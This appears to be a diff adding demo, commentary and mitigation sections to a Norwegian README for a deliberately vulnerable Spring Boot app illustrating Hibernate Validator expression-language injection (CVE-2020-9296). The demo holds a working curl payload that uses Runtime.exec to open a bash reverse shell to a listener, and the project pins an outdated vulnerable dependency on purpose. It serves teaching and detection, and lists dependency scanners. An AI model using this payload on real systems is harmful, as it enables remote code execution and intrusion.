@@ -83,3 +83,53 @@ returnere beskjed om at `pn` krever numerisk innputt:
   }
 ]
 ```
+
+## Demo ##
+
+Tre terminaler:
+1. `ncat -lkvp 31338`
+2. `mvn spring-boot:run`
+3. `curl -vv -G --data-urlencode 'pn=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`
+
+Merk at IP-adressen i terminal 3 må matche IP-adressen til lokal maskin.
+
+I terminal 1 kan man nå skrive vanlige bash-kommandoer og eksekvere dem på maskinen som kjører i terminal 2.
+
+Punkt 3 kan også utføres med POST:
+```shell
+curl -s -X POST -H "Content-Type:application/json" -d @pnError.json http://localhost:8080/postnr | jq
+```
+
+## Kommentarer
+
+Feilen er med i Hibernate Validator opp tom. 6.1.x-versjonene.
+6.2.x og 7.0.x legger begrensning på EL-tolkningen og defaulter til å ikke kunne kalle metoder. Se detaljer: https://in.relation.to/2021/01/06/hibernate-validator-700-62-final-released/,
+
+CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9296
+
+Netflix: https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor/
+
+## Strategier
+
+For å oppdage slike ting, bør en av de følgende vurderes. Den første er gratis, resten er abonnementsbasert. Snyk har noe gratis.
+
+* OWASP Maven Plugin (https://owasp.org/www-project-dependency-check/)​
+* Snyk (https://snyk.io/)​
+* Nexus IQ (https://help.sonatype.com/iqserver)​
+* Whitesource (https://www.whitesourcesoftware.com/)​
+* Black Duck (https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html)​
+
+
+### Tidlig oppdagelse
+
+http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
+
+## Generert kode:
+
+Koden er generert med https://start.spring.io/. Jeg har valgt Java 17 og lagt til 'Validation' og 'Spring Web'. I den genererte pom.xml, er så versjonen av spring-boot-starter-parent nedgradert til 2.4.13, siden 2.5.0 bruker Hibernate Validator 6.2.x. Merk at 2.4.13 er fra novemer 2021.
+
+## Dokumentasjon
+
+Java EE Expression Language: https://javaee.github.io/tutorial/jsf-el.html#GJDDD
+
+Hibernate Validator: https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/
